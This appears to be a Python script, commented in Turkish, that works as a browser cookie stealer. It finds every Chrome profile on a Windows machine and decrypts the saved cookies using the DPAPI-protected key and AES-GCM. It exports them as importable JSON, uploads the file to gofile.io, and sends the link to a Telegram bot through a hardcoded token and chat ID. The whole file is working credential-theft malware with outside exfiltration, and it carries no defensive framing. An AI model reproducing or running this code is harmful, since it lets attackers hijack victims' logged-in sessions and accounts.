import os
import shutil
import sqlite3
import json
import base64
import datetime
import requests
import win32crypt
from Crypto.Cipher import AES
import tempfile

TOKEN = '7302274941:AAEtXLRLgI5LYuzM351JFX04roSK0xrMx5Y'
CHAT_ID = '5048211088'
USER_DATA_PATH = "C:\\Users\\Serhat\\AppData\\Local\\Google\\Chrome\\User Data"

# Çerezleri deşifre etmek için gerekli fonksiyon
def decrypt_cookie(encrypted_cookie, key):
    try:
        iv = encrypted_cookie[3:15]
        encrypted_cookie = encrypted_cookie[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_cookie)[:-16].decode()
    except:
        return win32crypt.CryptUnprotectData(encrypted_cookie, None, None, None, 0)[1].decode()

# Chrome'un yerel durum anahtarını al
def get_encryption_key():
    local_state_path = os.path.join(USER_DATA_PATH, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # 'DPAPI' prefiksini kaldır
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# Çerezlerin saklandığı veritabanını kopyala
def copy_cookies_db(profile_path, temp_dir):
    cookies_db_path = os.path.join(profile_path, "Network", "Cookies")
    backup_path = os.path.join(temp_dir, f"Cookies_backup_{os.path.basename(profile_path)}.db")
    shutil.copyfile(cookies_db_path, backup_path)
    return backup_path

# Çerezleri çek ve decode et
def get_cookies(profile_path, temp_dir):
    db_path = copy_cookies_db(profile_path, temp_dir)
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value, creation_utc, expires_utc FROM cookies")
    cookies = []
    key = get_encryption_key()
    for row in cursor.fetchall():
        host_key = row[0]
        name = row[1]
        encrypted_value = row[2]
        creation_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=row[3])
        expiry_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=row[4])
        decrypted_value = decrypt_cookie(encrypted_value, key)
        cookies.append({
            "host_key": host_key,
            "name": name,
            "value": decrypted_value,
            "creation_time": creation_time,
            "expiry_time": expiry_time
        })
    conn.close()
    return cookies

# Çekilen çerezleri JSON dosyasına yazdır
def write_cookies_to_json(cookies, temp_dir):
    temp_file_path = os.path.join(temp_dir, "cookies.json")
    cookies_json = []
    for cookie in cookies:
        cookies_json.append({
            "domain": cookie["host_key"],
            "expirationDate": cookie["expiry_time"].timestamp(),
            "name": cookie["name"],
            "path": "/",
            "value": cookie["value"]
        })
    with open(temp_file_path, "w", encoding="utf-8") as file:
        json.dump(cookies_json, file, indent=4)
    return temp_file_path

# gofile.io'ya dosya yükleme
def upload_file_to_gofile(path):
    """Dosyayı gofile.io'ya yükler ve linki döndürür."""
    try:
        with open(path, 'rb') as file:
            response = requests.post(
                'https://store1.gofile.io/contents/uploadfile',
                files={'file': file}
            )
        response_data = response.json()
        if response_data.get('status') == 'ok':
            return response_data["data"]["downloadPage"]
        else:
            return 'Dosya yüklenemedi'
    except Exception as e:
        return 'Dosya yüklenemedi'

# Telegram'a mesaj gönder
def send_message_to_telegram(message):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': message}
    response = requests.post(url, data=data)
    return response

# Chrome profillerini bul
def get_chrome_profiles(user_data_path):
    profiles = []
    for item in os.listdir(user_data_path):
        item_path = os.path.join(user_data_path, item)
        if os.path.isdir(item_path) and item not in ["System Profile", "Guest Profile"]:
            profiles.append(item_path)
    return profiles

# Ana fonksiyonu çağır
if __name__ == "__main__":
    temp_dir = tempfile.mkdtemp()
    try:
        print("Çerezler yazılıyor...")
        profiles = get_chrome_profiles(USER_DATA_PATH)
        all_cookies = []
        for profile_path in profiles:
            try:
                cookies = get_cookies(profile_path, temp_dir)
                all_cookies.extend(cookies)
                print(f"Çerezler yazıldı: {profile_path}")
            except Exception as e:
                print(f"Bir hata oluştu ({profile_path}): {str(e)}")
        
        combined_cookies_path = write_cookies_to_json(all_cookies, temp_dir)
        
        print("Dosya yükleniyor...")
        download_link = upload_file_to_gofile(combined_cookies_path)
        print("Dosya yüklendi:", download_link)
        
        print("Telegram mesajı gönderiliyor...")
        send_message_to_telegram(download_link)
        print("Telegram mesajı gönderildi.")
    except Exception as e:
        print("Bir hata oluştu:", str(e))
    finally:
        shutil.rmtree(temp_dir)
        print("Geçici dosyalar silindi.")
        
    input("Devam etmek için Enter'a basın...")
